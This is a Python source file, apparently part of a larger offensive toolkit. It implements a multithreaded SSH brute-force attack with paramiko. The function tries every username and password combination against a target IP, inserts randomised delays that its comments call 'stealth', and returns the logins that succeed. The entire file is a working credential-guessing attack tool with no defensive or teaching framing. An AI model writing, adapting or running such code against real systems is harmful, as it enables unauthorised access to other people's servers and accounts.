import os
import customtkinter
import paramiko
import socket
import time
import random
from typing import List, Tuple
from utils.logger import log_event
import logging
from concurrent.futures import ThreadPoolExecutor

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def ssh_brute_force(
    target_ip: str,
    port: int,
    username_list: List[str],
    password_list: List[str],
    timeout: int = 5,
    delay_range: Tuple[float, float] = (0.5, 2.5),
    max_attempts: int = 100,
    threads: int = 5,
    stop_on_success: bool = True
) -> List[Tuple[str, str]]:
    """
    Perform an SSH brute-force attack on a target system.

    Args:
        target_ip (str): The IP address of the target.
        port (int): The port number for SSH.
        username_list (List[str]): A list of usernames to try.
        password_list (List[str]): A list of passwords to try.
        timeout (int): Timeout for SSH connections in seconds.
        delay_range (Tuple[float, float]): Range for random delays between attempts.
        max_attempts (int): Maximum number of attempts to perform.
        threads (int): Number of concurrent threads to use.
        stop_on_success (bool): Whether to stop after the first successful login.

    Returns:
        List[Tuple[str, str]]: A list of successful username-password pairs.
    """
    log_event("Starting SSH brute force on target: {}".format(target_ip))
    logging.info(f"Target IP: {target_ip}, Port: {port}, Max Attempts: {max_attempts}")

    def attempt_login(username: str, password: str, success_list: List[Tuple[str, str]]) -> None:
        """Attempt to log in with a specific username and password."""
        nonlocal attempts
        attempts += 1

        try:
            log_event(f"Trying {username}:{password} on {target_ip}")
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            client.connect(
                hostname=target_ip,
                port=port,
                username=username,
                password=password,
                timeout=timeout,
                banner_timeout=timeout,
                auth_timeout=timeout,
                allow_agent=False,
                look_for_keys=False
            )
            log_event(f"SUCCESS: {username}:{password} on {target_ip}")
            success_list.append((username, password))
            client.close()

            if stop_on_success:
                raise StopIteration  # Stop all attempts if success is achieved

        except paramiko.AuthenticationException:
            logging.warning(f"Authentication failed for {username}:{password}")
        except (paramiko.SSHException, socket.error, socket.timeout) as e:
            log_event(f"Connection error: {str(e)}")
            time.sleep(random.uniform(2, 5))  # Cooldown on error
        finally:
            delay = random.uniform(*delay_range)
            time.sleep(delay)  # Stealth delay

    success = []
    attempts = 0

    # Start brute-forcing with threading
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [
                executor.submit(attempt_login, username, password, success)
                for username in username_list
                for password in password_list
            ]
            for future in futures:
                try:
                    future.result()  # Ensure exceptions are raised
                except StopIteration:
                    break

    except Exception as e:
        log_event(f"Error during brute force: {str(e)}")
        logging.error(f"Error: {str(e)}")

    log_event(f"Brute force completed with {attempts} attempts.")
    logging.info(f"Total Attempts: {attempts}, Successes: {len(success)}")
    return success
